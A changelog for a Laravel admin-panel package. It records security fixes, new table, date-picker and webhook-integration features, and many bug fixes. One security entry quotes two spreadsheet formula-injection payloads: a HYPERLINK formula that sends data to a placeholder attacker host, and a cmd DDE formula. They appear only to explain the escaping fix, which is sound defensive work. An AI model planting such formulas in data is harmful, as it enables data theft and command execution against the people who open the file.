# Changelog

All notable changes to `panda-panel` are documented here.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project
adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security

- **`package.json` reaches the Composer archive, so `panel:install` can see the frontend
  dependencies again.** `.gitattributes` carried `/package.json export-ignore`, and
  `FrontendRequirements::npmPackages()` reads that file at runtime from inside `vendor/` to tell an
  application which npm packages the published components import. In a dist install it found no
  manifest, returned an empty list, and `panel:install` reported **no missing npm dependencies** —
  which reads as "everything is installed" when in fact the check could not look. The one command
  whose job is to name what is missing said nothing was.

  Nothing in the suite caught it because the suite runs with this repository as the application,
  where the file is always on disk. `Negative/DistributionTest` now asserts the archive attribute
  directly, and `FrontendRequirements::hasNpmManifest()` separates "nothing is missing" from "I
  could not look" so `panel:install` reports the second as a packaging fault rather than as good
  news. `package-lock.json` stays export-ignored: an application resolves its own.
- **CSV exports no longer execute what somebody typed into a text field.** A cell beginning with
  `=`, `+`, `-`, `@`, a tab or a carriage return is a formula as far as Excel, LibreOffice and
  Sheets are concerned, and they evaluate it when the file is opened —
  `=HYPERLINK("http://attacker?x="&A1,"Click")` exfiltrates the row beside it, and
  `=cmd|'/c calc'!A1` is worse. The attacker is anyone who can write a record field and the victim
  is the administrator who opens the export, which is exactly the shape of an admin panel. CWE-1236.
  Quoting never prevented it: CSV quoting is about parsing the file, not about what a cell means
  once parsed. Such cells now carry a leading apostrophe, which every spreadsheet reads as "this is
  text" and does not display. `Exporter::escapesFormulas()` turns it off for a feed another
  *program* parses, where nothing evaluates anything and the apostrophe would be corruption rather
  than a fix. XLSX was never affected — `Xlsx` writes `t="inlineStr"` cells, and a formula in that
  format lives in an `<f>` element the writer does not emit.
- Uploads are authorized by the form the field belongs to, and reading a resource is no longer
  enough. `page=create` asks `create`, `page=edit` asks `update` on the named record, a relation
  form asks the relation manager's own abilities per operation, and an action's form asks the
  action. The endpoint previously accepted `canCreate() || canViewAny()`, so a read-only role
  could write files to a disk.
- The upload endpoint reads its context — resource, page, record, relation, action — from the
  query string only. A form whose values happened to include a `resource` key could previously
  point the upload at a different one.
- `page` is an allowlist rather than "edit, or else create". An unrecognised value used to become
  the create form, which is the one branch that needs no record.

### Added

- **A table can be drawn as a grid of cards.** `TableSchema::cards()` declares a card face and the
  toolbar grows a layout toggle; `?layout=grid` is whitelisted against the layouts the table offers,
  echoed in `state()['layout']`, and remembered by `persistColumnsInSession()`. It is a second
  renderer over one schema rather than a second page — the query, the filters, the search, the tabs
  and the pagination are the identical ones the row table uses, which is why almost none of them
  needed changing.

  A card face arranges the columns the table **already declares** — five slots holding column
  *names*, not a parallel set of card components. A `BadgeColumn` on a card renders through the same
  cell renderer it uses in a row, from the same definition, so a column changed once changes
  everywhere it is drawn. `cards()` takes no required argument: called bare, the face is inferred —
  the first image column is the picture, the first non-editable column is the heading, badge/boolean/
  icon columns become chips, and the next four become value rows. A description is deliberately never
  inferred, because there is no rule for "which column is the subtitle" that is right more often than
  it is wrong.

  Two things the grid does not do, both decided rather than missed. **A reorderable table offers no
  grid at all**: an order arranged by dragging is linear, and dragging a card into place in a grid
  that wraps is a different interaction needing a different affordance — this is enforced on the
  server, so the toggle simply does not render. And **frozen columns, column widths and per-column
  search are inert**, because each of them means "a column of a table" and there is no header here
  to apply them to. Summaries do survive, as strips rather than footer rows — table figures under
  the grid and a band's own closing the run of cards it heads. A total that vanished because
  somebody changed how the list is drawn would be a real loss on a ledger.

  Sorting needed new work. The row table's only sort control is its column headers, so grid layout
  puts a menu of every `sortable()` column in the toolbar. It emits the same event into the same
  handler, so a different column sorts ascending and the active column reverses, with no second copy
  of the rule that decides it.

### Changed

- **A relation a column names is eager loaded without being asked.** `TextColumn::make('author.name')`
  reads its value through `data_get()`, which loads the relation once per record — the N+1 whose only
  defence was remembering `$with`. Measured on twenty rows with one dotted column: **22 queries before,
  3 after.** The same derivation runs for exports, from the columns actually being written, which is
  the one N+1 with no page size to bound it: an export walks the whole result set, and an exporter may
  write columns the table never shows, so a `$with` sized for the list never covered them.

  Derivation is best effort and never fatal. Each segment of a dotted name is verified against the
  model before it is claimed, and anything unverifiable is dropped rather than guessed at — a JSON
  column addressed as `meta.total` is not a relation and must not become `with('meta')`. Adding an
  eager load can only reduce queries, but getting one wrong must not be able to break a page that
  works.

  `$with` is unchanged and still needed for every relation with no name to read it from: one reached
  by a `formatUsing()` closure, by `recordTitle()`, or by a policy. See
  [Query performance](docs/resources/performance.md), a new page covering what is derived, what is
  not, why every read is `select *`, and how `Model::preventLazyLoading()` turns a missed eager load
  from a slow page into an exception.
- **A hidden column costs nothing.** `toRow()` serializes the columns the current arrangement shows,
  so a column turned off in the column manager is no longer read from the record, passed through its
  closures, or sent to the frontend. Hiding a column previously reduced only what Vue drew — the value
  was still read, `formatUsing()` and `urlUsing()` still ran, and for a dotted column a relation was
  loaded to be discarded. Two exceptions, both deliberate: a card layout keeps its image and title
  columns whatever the arrangement says, because a card draws them regardless; and a caller with no
  arrangement to read still gets every column.
- **A bulk action is one transaction.** `Action::executeBulk()` now wraps the whole selection on the
  same three-level rule as every other write. It used to be neither one transaction nor none: a
  `bulkAction()` closure ran unwrapped, and the per-record fallback opened one transaction per record
  — so a failure on the seventh of ten left six committed and six rows changed by an operation the
  user was told had failed. Every built-in bulk action already opened its own `DB::transaction()` to
  avoid exactly that, which is the clearest sign it was the wrong default; theirs is now a savepoint
  inside it, with the same outcome. An action that genuinely wants partial application says
  `->databaseTransaction(false)`, the same switch every other write has.

- **A date is now picked from a calendar, not from the browser's own control.**
  `DatePicker` and both bounds of a `DateFilter` mount
  `resources/js/panel/components/PanelDatePicker.vue` — a
  [shadcn-vue date picker](https://www.shadcn-vue.com/docs/components/date-picker) built from the
  `Popover` and `Calendar` components this package already publishes. `<input type="date">` is the
  *browser's* widget: Chrome, Firefox and Safari each draw a different one, none of them themeable,
  and their clear affordances differ — Firefox has none at all. A field a panel cannot style is a
  field that will not match the branding the panel was given.

  Nothing behind it moved. The control emits an ISO `Y-m-d` string or `null`, exactly as the native
  input did, so `minDate()`, `maxDate()`, `required()`, `disabled()` and every validation rule mean
  what they meant, and no PHP changed. The two calendars of a range now bound each other, which is a
  convenience rather than the rule — `DateFilter::sanitize()` still swaps a reversed range arriving
  from a hand-edited URL, because a control cannot be what enforces that. The picker carries its own
  clear button, since a popover has no equivalent of the native input's; it is hidden on a
  `required()` field, where there is no empty state to return to.

  `DateTimePicker` and `TimePicker` are deliberately still native. shadcn-vue's date picker covers a
  date; a time and a date-time need a different control, and changing them on the same reasoning is
  a separate decision rather than an implied one.

### Fixed

- **Four filter chips named their filter and then said nothing useful.** Indicators are built on the
  server precisely because only a filter knows what its value means — the rule the code states is
  that `1` is "Verified", not "1" — and four of the seven filters never used that knowledge.
  `Filter::describe()`, the inherited one, casts a scalar and returns `''` for anything else, so
  `SelectFilter` printed the option *key* (`Status: published`), `BooleanFilter` printed the boolean
  (`Verified: 1`, the exact thing the rule forbids), `TrashedFilter` printed `Deleted records: only`,
  and `DateFilter` — whose value is an array — printed `Created At: ` with nothing after the colon
  at all. A chip that cannot say what it is doing is a chip that reads as broken. Each of the four
  now describes its value the way its own control spelled it, and `TrashedFilter`'s option labels
  moved to one constant so the dropdown and the chip cannot disagree about what `only` is called.
- **Closing a filter chip on a deferred table no longer discards what you were composing.** The
  chip's `×` applied immediately — correctly, since a chip shows what the server is *already*
  narrowing by — but it emitted on its own, and the server's answer resets the pending map. Filters
  set but not yet applied vanished without a word. The removal now travels in the same visit as
  whatever is staged.
- **A schema that cannot mean what it says is now refused, loudly.** Six declaration mistakes were
  silent, and all six produced wrong behaviour rather than no behaviour. `PanelSchemaException`
  covers them, and every message names the offending name and the fix:
  - **Two columns with the same name** serialized as two columns that then shared one key for the
    cell value, the visibility state, the search term and the sort.
  - **Two form fields with the same name** collapsed into one validation rule, so the other field
    was rendered, filled in, submitted and discarded without a word.
  - **Two actions with the same name in one set** gave the action endpoint a choice it resolved by
    taking the first — so the second button always ran the first action.
  - **An action with no `url()`, `action()`, `form()` or `modal()`** rendered a button that did
    nothing when pressed.
  - **`defaultSort()` naming a column the table does not have** was serialized and then dropped by
    the sort whitelist, so the table fell back to its natural order with nothing to say why.
  - **A column, field or action with an empty name.**
  - **Two filters with the same name**, whose state is keyed by name in the query string, so the
    second control wrote over the first one's value.
  - **A widget column span that is neither a number nor `'full'`** — `'ful'` answered `1`, a
    quarter of the width that was asked for, from a typo. Numbers out of range are still clamped:
    99 is an ask and four is the honest answer, but a word is a mistake and clamping hides it.
  - **A widget column span at a breakpoint this grid does not have** (`'sm'`, `'xxl'`) was skipped
    in silence, so the line of configuration did nothing.

  **Breaking:** these throw where they previously did nothing. An application carrying one of them
  has a bug today and will get an exception at schema-build time after upgrading — which is at boot
  or on first render, so a test suite finds it before a user does. See `docs/upgrade.md`.
- **An exporter that declares the same column twice is refused.** The file would carry two
  identical headings, and the column picker keys its selection by name — so choosing one chose both
  and unchecking it removed neither. Export and import columns also refuse an empty name, like
  every other named thing in a schema.
- **A widget or form component that is not in the build-time registry says so, in development.**
  Both registries answered null for an unknown name and the caller drew a neutral fallback, which
  looks exactly like a component that rendered nothing — and the three reasons for it (a typo, a
  file outside the globbed directory, a build that was not re-run) are indistinguishable from the
  screen. They now warn once per name, naming the directory the component has to live in.
- **A tenant relationship that is not a relationship is refused by name.** `$tenantRelationship`
  was checked with `method_exists`, so a scope, an accessor or a plain helper passed and then
  failed inside `whereHas` as "Call to a member function getRelated() on null" — an error about
  Eloquent's internals naming neither the resource nor the property that pointed at it.
- **An import fails once when the file has no column for a required one.** An unmapped required
  column produced a validation failure on *every row* — "The email field is required", ten thousand
  times — which is a true statement about the wrong thing. It now stops before reading a single
  row, naming the missing columns and listing the headings the file actually has.
- **A stale panel manifest says so, in development.** `panel:cache` writes a list of class names
  and discovery then never runs — which is the point of it, and the trap: a resource added
  afterwards simply is not in the panel. No route, no navigation entry, no error, and no way to
  guess that `panel:clear` is the answer. The manifest now records a fingerprint of the discovery
  paths (file count and newest mtime), and boot compares it. **Only when a manifest exists and only
  outside production**, so it costs nothing in the case it is not for. The file gained a `panels`
  key alongside `fingerprint`; a manifest written by an older version still loads unchanged, so an
  upgrade does not need a cache clear to boot.
- **A resource missing from the sidebar for want of a policy says so, in development.**
  `Gate::allows()` denies when no policy exists, which is correct and indistinguishable from a
  policy that considered the question and said no. When navigation drops a resource *and* the model
  has no policy at all, the panel now logs once per model, naming the `make:policy` command and
  `Panel::strictAuthorization()` — which already turns this into an exception everywhere the panel
  asks, and which nobody finds by staring at a gap in a sidebar.
- **The documented verification loop can now be run.** `composer run types:check`,
  `composer run lint:check`, `npm run types:check` and `npm run lint:check` appeared in the master
  document and in this repository's own agent skill, and none of the four has ever existed in
  either manifest. The real names are `composer run analyse` / `format-check` / `test` and
  `npm run typecheck` / `lint` / `format:check` / `build`. `Negative/DistributionTest` now reads
  every command out of the documentation's own bash blocks and fails when one is not a declared
  script.
- **An icon that is not in the registry says so, in development.** `resolveIcon()` answered null
  for an unknown name exactly as it does for no name, so a mistyped icon — or, far more often, one
  declared in PHP after `php artisan panel:icons` was last run — drew nothing with no way to find
  out why. It now warns once per name in development, naming the icon and the command that fixes
  it. Production is unchanged: the icon is still simply absent, because this is a build problem
  rather than a runtime one.
- **A resource that forgets `$model` says so.** PHP answered `Typed static property
  PandaPanel\Resources\Resource::$model must not be accessed before initialization`, which names
  this framework's class rather than the resource that forgot, and does not say what to write. It
  now names the resource and prints the line to add.
- **Column spans no longer overflow their grid.** A span was clamped against the *declared* column
  count, not the count at the breakpoint being rendered. A four-column form is two columns wide at
  `md`, so `columnSpan(3)` and `columnSpan(4)` emitted `md:col-span-3` / `md:col-span-4` against two
  tracks — `grid-column: span 4` creates the missing tracks implicitly, and the row overflowed
  sideways. Spans are now clamped per breakpoint, and `columnSpanFull()` compiles to
  `col-span-full` (`grid-column: 1 / -1`) rather than resolving to a number that is only right at
  one width.
- **`columns()` above four rendered one column.** Ten of the eleven `columns()` setters had no upper
  bound, the renderer has literal classes for one to four, and anything else hit the one-column
  fallback — the widest possible ask reported as the narrowest possible result, silently. Every
  setter now clamps through `PandaPanel\Support\ColumnCount`.
- **`FormSchema::columns()` had no effect.** The root count was serialized and then ignored: the
  form renderer stacked its top-level nodes in a flex column, so a field asking for half a row got a
  whole one. The root is now a grid like every other container. Layouts still take the full width,
  so a form built out of sections is laid out exactly as before.
- **The three grid class tables are one.** The form grid, the infolist node and the infolist
  renderer each carried their own copy, and they had drifted — a four-column form dropped to two at
  `md` while a four-column infolist stayed at four, so the same declaration laid out differently
  depending on which drew it. All three now read `panel/lib/grid.ts`, whose tables
  `FrontendContractTest` checks against the PHP clamp.
- **Plugin version constraints are checked again.** `PluginCompatibility::PACKAGE` was left as
  `panda-panel` when the composer package was renamed to `chocoalano/panel`, so
  `InstalledVersions::getPrettyVersion()` threw on every call. The class reads that as "not
  installed as a package" and answers null, and a null version skips the constraint — so every
  `requiresPanel` a plugin declared had been passing unexamined, in every installation, since the
  rename. The check itself was still there and would never have said no again.
- **Panel pages declare their own layout.** All sixteen published pages relied on the application's
  `app.ts` having a case for `panel/`, and nothing checked. Where it was missing every panel screen
  rendered inside the starter kit's `AppLayout` — host sidebar, no panel navigation, registered
  resources nowhere — at HTTP 200 with no error and no warning. They now carry
  `defineOptions({ layout })`, so the wiring is not needed at all; auth pages carry
  `PanelBlankLayout`, which adds nothing, because they already draw their own frame.
  `panel:install` additionally reads `app.ts` and reports the one case the package cannot fix from
  the inside — an unconditional `page.default.layout = AppLayout` — by file, line, and replacement.
- **Broadcasting no longer assumes a broadcaster.** `Panel::$broadcasting` defaults to `true`, so
  the server sent a channel to every signed-in user and the client called `echo()` on it. In an
  application with no broadcaster that threw "Echo has not been configured" from inside
  `onMounted`, which aborted the panel layout's mount and produced a cascade of
  `Slot "default" invoked outside of the render function` warnings — none of which name a
  broadcaster. `SharePanelData` now withholds the channel unless a broadcast connection is actually
  configured (`BroadcastSupport::isConfigured()`), and `echo()` is wrapped so a frontend that never
  called `configureEcho()` gets one development-only console warning instead of a broken screen.
  **Behaviour change:** an application that broadcasts from PHP but has `BROADCAST_CONNECTION=null`
  or `log` now gets no panel channel. That was already a connection no browser could subscribe to;
  what changes is that the panel says so instead of failing at mount.
- **The published TypeScript compiles in an application.** `usePanel` and `useNavigation` read
  `usePage().props.<key>` and depended on a `declare module '@inertiajs/core'` augmentation
  published into `resources/js/types/` — a directory the host already owns and already declares
  things in. Where that did not take effect, `page.props` was `{}` and the *application's*
  `vue-tsc` reported fourteen errors inside files nobody there wrote. The panel now reads its props
  through `panel/types/shared.ts`, which needs no augmentation, and no longer ships a declaration
  for `name`, `auth`, or `sidebarOpen` — those are the application's to declare.
- **`FrontendRequirements` actually checks its host-module list.** A bare `''` in the extension list
  meant `File::exists()` matched the *directory*, so `@/types` was satisfied by the folder this
  package publishes into and could never fail — the same for `@/routes`. `.d.ts` and `/index.d.ts`
  are now recognised (a starter kit writes `types/index.d.ts`), the bare match is gone, and
  `@/types/ui` — imported by the panel's broadcasting and flash bridge, never shipped, never
  listed — has been added. A new `FrontendContractTest` derives the list from the imports in the
  published tree, so the next omission fails here rather than in somebody's build.

### Added

- **Frozen columns.** `Column::frozen()` pins a column to the leading edge and
  `frozen(ColumnPin::End)` to the trailing one, on every column type — it lives on the base class,
  which is the only thing that makes "every column" true rather than "the ones somebody remembered".
  `TableSchema::frozenActions()` does the same for the row actions, off by default. Freezing a
  column freezes the structural cells on the same side of it: the reorder handle and the selection
  checkbox to the left, the actions to the right.

  A pinned column is drawn at the edge it is pinned to, whatever position it was declared in,
  because a sticky cell is offset by the width of the frozen columns before it and one left in the
  middle would be offset over the top of its neighbours. Offsets are measured from the widths the
  header cells actually take rather than added up from declared `width()`s, so a column sized to its
  content — the normal case — stays lined up. The header, the per-column search row and the summary
  footers pin with the body, frozen cells are `bg-inherit` so they are opaque without losing the
  row's hover and selected background, and the last cell on each side carries a seam so columns do
  not appear to teleport. Pinning drops itself above 60% of the visible table width, rechecked on
  every resize, so a phone is not left with a strip too narrow to read the rest through.
- **Resource integrations.** A resource that calls `integrations()->isEnabled(true)` — `false` is
  the default — gets a Postman-shaped screen where an administrator configures outbound HTTP fired
  on its writes, at six triggers: before and after create, update and delete. The triggers hang off
  Eloquent's own model events rather than the resource pages, so a record written by a form, an
  action, a bulk action, an importer, a console command or a queued job fires all six — and
  deletion, which has no page hooks at all, is covered for the first time. `after` triggers are
  queued and retried; `before` ones are sent inline with a short timeout. **An integration is a
  notification, not a gate**: no response, timeout or transport failure can cancel a write, because
  an endpoint going down should not also mean nobody can save.

  Two gates guard every destination, enforced when an integration is saved *and* again immediately
  before each request: `integrations.allowed_hosts` is an allowlist that starts **empty**, so
  nothing is reachable until a destination is added to config; and `block_private_networks` refuses
  any host resolving into the private, loopback or link-local ranges — `169.254.169.254`, the
  unauthenticated cloud metadata endpoint, stays blocked even with the allowlist set to `*`.
  Reaching the screen additionally requires the `manage-panel-integrations` gate, which denies when
  no gate is defined. Hidden model attributes are excluded from the payload, and hand-written bodies
  use a path-only `{{ record.field }}` substitution that is deliberately not Blade.

  **Signed.** Every request carries `X-Panel-Signature` — `hash_hmac('sha256', "{timestamp}.{body}",
  $secret)`, Stripe's scheme — and `X-Panel-Delivery`, a uuid stable across the retries of one
  delivery so a receiver can deduplicate. The timestamp is inside the signed string, so a captured
  request cannot be replayed forever. Secrets are generated on create and encrypted at rest, so
  signing is never something somebody forgot to enable; rotate from the Signing tab.
  `IntegrationSignature::verify()` ships for the receiving end, because `hash_equals` is the detail
  hand-rolled verifications get wrong.

  **A bounded history.** Every attempt is recorded with its status, duration, bodies and error, and
  shown on the History tab — never the headers, which hold the API keys these requests carry. The
  table prunes itself after each delivery against two bounds: a hard cap per integration
  (`keep_per_integration`, default 50), which holds in an application with no scheduler at all, and
  a retention window (`retention_days`, default 30) for integrations that fire rarely. Turn it off
  entirely with `history.enabled`.

  Ships two migrations, `panel_integrations` and `panel_integration_deliveries`.
- **`FormSchema::__call()` answers a call meant for a field.** `$schema->columnSpanFull()` raised
  "Call to unknown method", which names the class but not the mistake. It now names the mistake and
  shows the corrected chain. Unrecognised methods still get the ordinary error.
- **`columnSpanFull()` on form fields and infolist entries.** Full width previously had to be
  written as `columnSpan(2)`, which is the container's column count spelled out in the field —
  correct until somebody changes the section to three columns, at which point every such field is
  silently two thirds. It serializes as `'full'` and is resolved where the row is drawn. Calling it
  on a `FormSchema` was, and remains, a `BadMethodCallException`: a schema is the root and has
  nothing to span. `columnSpan()` on an infolist entry now clamps to one like the form's does,
  instead of accepting `0`.
- **Signing in lands in the panel.** A starter kit's `/dashboard` is a placeholder and Fortify
  points its post-login redirect at it, so an install used to finish with the panel reachable only
  by typing its URL. `RedirectPanelHome`, a fourth `web` middleware, now sends a signed-in visitor
  to the first panel they can enter. No application file is edited to do it — the route, its name,
  and `pages/Dashboard.vue` all stay where they are, and `home_redirect.enabled` gives the screen
  back. `home_redirect.paths` takes `Request::is()` patterns; a path a panel is mounted on is
  ignored, so a panel at `/dashboard` cannot redirect to itself.
- **Resource pages carry `$title`, `$heading` and `$subheading`**, the same three a standalone
  `Page` has, with `getTitle()` / `getHeading()` / `getSubheading()` for text that depends on the
  record. Each falls back to what the page said before, so nothing changes until one is declared.
  A custom page extending `ResourcePage` now gets the resource's plural label rather than no
  heading at all.
- **Tenancy as public API.** `Panel::tenant()`, the `PanelTenant` and `HasPanelTenants` contracts,
  `PandaPanel\Tenancy\Tenancy`, the `ResolveTenant` middleware, and
  `Resource::$tenantRelationship` for automatic scoping. The framework identifies, authorizes,
  binds and scopes; it does not create databases, switch connections or read subdomains — see
  `docs/panel-tenancy.md` for putting it together with `stancl/tenancy`. A scoped resource asked
  outside a tenant raises rather than running unscoped.
- **The testing helpers ship.** `panelTable()`, `panelForm()`, `panelRecordActions()` and the rest
  moved from this repository's `tests/` to `PandaPanel\Testing\*`, autoloaded through composer,
  so an application's suite can ask the same questions this one does.
- **A frontend toolchain**: `package.json`, `vite.config.ts`, `tsconfig.json`, ESLint, Prettier,
  and `lint` / `typecheck` / `build` / `ci` scripts over all 337 Vue and TypeScript files. CI runs
  them on Node 20, 22 and 24, plus a non-blocking job against the top of every dependency range.
  Nothing ships: every file is `export-ignore`d.
- `frontend/host/` — minimal stand-ins for the eighteen modules the published components import
  and do not ship, so the package can type-check and build on its own. Documented there, and
  checked in a real application by `panel:install`.
- `panel:user`, which creates an account that can sign in — through the auth guard's own model
  rather than a guessed `App\Models\User` — and says which rule refuses it when the new account
  cannot reach the panel.
- **An upgrade path for the published frontend.** `panel:assets` reports which published
  files are behind, which this application edited, and which are both, and `--update`
  writes only the ones that are safe to write. It works from `.panel-assets.json` — the
  hash of every file *as it was published* — which is the third value that separates a
  stale file from an edited one. `vendor:publish` cannot make that distinction, which is
  why its two settings are both wrong on an upgrade: without `--force` nothing updates,
  with `--force` deliberate edits are overwritten. A file changed on both sides is
  reported by path and never written.
- `PandaPanel\Support\Installer\PublishedAssets`, one definition of what this package
  publishes, read by both the service provider's `publishes()` and `panel:assets` — two
  copies of a publish map drift, and the symptom is a file that publishes but is never
  reported as out of date.
- **A tenant switcher.** `Panel::tenantUrlUsing()` says how a tenant is addressed, and the header
  grows a switcher filtered to the tenants the user may actually enter. Without a URL builder it
  does not render: identification is the application's, so reversing it into a URL is too, and a
  switcher whose entries went nowhere would be worse than none.
- **Plugin metadata and a compatibility check.** `PluginMetadata` carries a name, a composer
  package, a `requiresPanel` constraint and a URL; the version is read from composer rather than
  restated. The constraint is checked when the plugin registers, so a plugin built against an older
  framework is refused by name instead of failing later with `Call to undefined method
  Panel::whatever()`. `panel:plugins` lists what is installed, on which panel, at which version.
- `docs/testing.md` — every shipped helper, and what is actually worth asserting about a panel.
- `docs/compatibility.md` and `docs/upgrade.md`.
- `PandaPanelServiceProvider`, which registers the container bindings, the panels named in
  `config/panda-panel.php`, the route groups, the middleware, the commands, the migrations, and
  every publish tag. The package previously declared a provider in `composer.json` that did not
  exist, so `composer require` failed at package discovery.
- `PandaPanel\Facades\PandaPanel`, the facade `composer.json` had always aliased.
- `panel:install` (see **Changed** for what it grew into).
- `PandaPanel\Http\Middleware\SharePanelData`, which shares `panel`, `navigation`, `panels`,
  `search`, `notifications` and `broadcasting`. These props previously had to be hand-copied into
  the application's own `HandleInertiaRequests`.
- `PandaPanel\Contracts\PanelNotifiable`, naming what the notification centre needs a user model
  to be.
- Publish tags: `panda-panel-config`, `panda-panel-assets`, `panda-panel-migrations`,
  `panda-panel-stubs`.
- A negative test suite under `tests/Feature/Panel/Negative/` — 78 tests covering hostile table
  input, privilege escalation, path traversal and cross-user file access, malformed payloads, and
  resource-scope bypass. Three of its guards were verified by deleting them and confirming the
  suite fails.
- A Testbench harness, and `examples/` as the application it runs against — a user model, two
  panels, their policies, and the routes an application keeps once a panel arrives.

### Fixed

- **Clearing a table filter now clears it.** The server's rule is that the request wins whenever it
  mentions a value — including saying it is empty — and that absence is the only case that falls
  back to the session. The client broke that contract by *deleting* keys when clearing, so
  "cleared" and "never mentioned" arrived as the same request and the session put the filter
  straight back. Clearing the last filter, the "Clear filters" button, and clearing the search box
  were all affected. The client now says `filters=` and `search=` out loud.
- **A filter default could never be cleared.** `resolvedFilters()` re-applied a default whenever the
  resolved map was empty, which is also what "the user just cleared everything" looks like. It now
  distinguishes an empty map from an unspoken one, so a default fills genuine silence and nothing
  else.
- **Import column mapping past column Z.** The mapping select was built with `chr(65 + $index)`
  over `range(0, 25)`: correct for exactly twenty-six columns, and unfixable by hand after that —
  a spreadsheet with thirty columns had its last four unmappable, and index 26 would have rendered
  as `[`. Positions are now real spreadsheet labels (A…Z, AA, AB…) up to two hundred columns, and
  the select is searchable. Heading matching was never bounded, so a wider file still maps
  automatically.
- **A queued import or export that throws no longer disappears.** Neither job had a `failed()`
  handler, so a failure left the uploaded file on the disk — a copy of customer data nothing would
  ever delete — and left the user watching a notification bell that would never ring. Both now
  clean up and report, with the exception's own message.
- **Import is never retried; export is retried three times.** Not a preference: an export only
  reads rows and writes a file, so a failed attempt has changed nothing, while an import that
  failed halfway has already written rows and there is no general way to know which. Retrying an
  import would turn one bad import into two.
- **Laravel 12 actually works.** `Password::defaults()->toPasswordRulesString()` is a
  Laravel 13 method, and three pages called it directly — so the login, register,
  reset-password and security settings screens were a 500 on Laravel 12, under a
  constraint that claimed to support it. `PandaPanel\Support\PasswordRules` uses the
  framework's method where it exists and reproduces its exact output from
  `appliedRules()` where it does not. The whole suite now passes on both majors, and
  static analysis runs at both ends of the range because each end is certain about the
  other in a way that is wrong.
- `examples/resources/views/app.blade.php` uses Inertia's Blade directives rather than
  its class components. Component resolution falls back to
  `Application::getNamespace()`, which reads `autoload.psr-4` — and this suite's
  application lives in `examples/app` under `autoload-dev`, so `view:cache` failed on
  Laravel 12 and cascaded into a dozen unrelated tests.
- The `notifications` migration's `down()` no longer drops a table the application owned. `up()`
  has always skipped a table it found, so `down()` and `dropIfExists()` were not symmetric and
  rolling this package back deleted an application's notifications. `PandaPanel\Support\PackageSchema`
  now establishes ownership — no other ran migration claims the name, and the columns are exactly
  the ones `up()` creates — and leaves the table standing whenever the answer is not a clear yes.
- Generators read the package's own stubs, falling back to the application's published copies.
  They previously read `base_path('stubs/panel')` only, so every `make:panel*` failed on a real
  install.
- `panel:icons` scans the framework's source as well as `app/`. It previously saw only the
  application's panels, so running it in an installed project stripped every built-in action's
  icon out of the registry.
- `panel:icons` no longer empties the registry when `@lucide/vue` is absent; with nothing to check
  names against, the declared names are taken as given.
- The `notifications` and `two_factor_email_confirmed_at` migrations check before they touch
  anything, and run from the package by default — a panel cannot render its first page without the
  notifications table.
- The unread count degrades to zero rather than 500ing when that table has not been migrated yet.
- The web middleware are appended to the `web` group as the HTTP kernel resolves, so
  `bootstrap/app.php` no longer silently overwrites them.
- Stub imports are ordered so generated code passes `pint --test`.
- `PanelManifest` writes through `bootstrapPath()` instead of `base_path('bootstrap/...')`, so an
  application that relocates that directory does not end up with a manifest `optimize:clear`
  cannot find.
- `docs/` and `.ai/rules/` name `PandaPanel\*` and `src/**` rather than the pre-extraction
  `App\Panel\*` and `app/Panel/**`.

### Changed

- **An empty dashboard explains itself.** The first screen after an install used to be a dashed box
  reading "No widgets on this dashboard" — true, and useless, and drawn with an icon that was not
  in the registry so it rendered nothing at all. `DashboardGuide` replaces it: the two generator
  commands with this panel already filled in and a copy button on each, plus links to the
  destinations the panel already has, so a new panel is not a dead end. All of it reads props the
  shell already shares, so an empty dashboard still costs no query.
- **The resource index is laid out as one object rather than five.** Tabs, the toolbar, the rows and
  the pagination are joined into a single bordered surface divided by rules, instead of four blocks
  floating in equal 24px gutters — which said they were four equally-related things and cost about
  120px of nothing above the first row. The page heading is `text-xl` rather than `text-2xl`, and
  the page rhythm is 16px. All of it buys rows on screen, which is what a dense screen is for.
- **The selection bar and the form's save row are sticky.** Selecting a row used to insert a block
  that pushed every row down, moving the checkbox out from under the pointer mid-selection; and on
  a long form, Save was a scroll away from wherever you were. Both are now pinned to the bottom of
  the viewport. This also required `overflow-x-clip` in place of `overflow-x-hidden` on the content
  wrapper: `hidden` on one axis computes the other to `auto`, which makes that element a scroll
  container and silently captures every `position: sticky` inside it. `StylingTest` guards it,
  because that failure is invisible.
- `DataTable` takes a `bordered` prop. True standalone — a relation table, a table widget — and
  false on the resource index, where the surface around it is already the frame.
- **PHP 8.2 is supported.** The floor was `^8.3` and nothing required it — no typed class
  constants, no `#[\Override]`, no 8.3 standard library. PHP 8.2 resolves through Laravel
  12, and CI runs that combination. Laravel 11 remains unsupported and cannot be
  supported: every 11.x release is flagged by unpatched security advisories and composer
  refuses to resolve against it.
- The CI matrix runs ten test jobs (PHP 8.2/8.3/8.4 × Laravel 12/13 × lowest/stable,
  less the combination Laravel 13 does not allow), and static analysis twice.
  `composer require` for the framework and for testbench are separate calls, because one
  call moved testbench out of `require-dev`.
- `panel:install` is end-to-end: it registers the scaffolded panel in `config/panda-panel.php`
  itself, checks the npm dependencies, the eighteen host modules, Vite and Inertia, and offers to
  create a user, and records `.panel-assets.json` so the next upgrade can tell an edit
  from a stale copy. It ends by naming what is left rather than by printing steps that
  always appeared.
- The guest redirect is registered by the service provider rather than being a manual
  `bootstrap/app.php` step, using the same `afterResolving(Kernel::class)` ordering that made the
  manual step necessary. `register_guest_redirect` turns it off for an application that sets its
  own.
- `PanelPlugin::publishes()` is on the contract rather than only on the `Plugin` base class, so
  `panel:publish` asks any plugin — including one shipped as its own package, which should
  implement the interface directly. `Plugin::in($panel)` reads a plugin's configuration back from
  a panel.
- `composer.json` declares what the package actually uses: `laravel/framework`,
  `inertiajs/inertia-laravel`, `laravel/fortify`, `symfony/finder`, `ext-zip`, and
  `src/Support/helpers.php` as an autoloaded file. `minimum-stability` is now `stable`.
- `config/panda-panel.php` describes this package. It previously configured a skeleton whose
  classes were never written.

### Removed

- `routes/web.php`, `resources/views/index.blade.php` and `resources/lang/`, all left over from a
  package skeleton and all referring to classes that did not exist.
- `integration/`, a copy of the application the framework was extracted from, still on the old
  `App\Panel\` namespace. `examples/` covers what it documented, and is executed by the suite.
- `docs/architecture.md`, the prompt the framework was generated from rather than documentation
  of it.
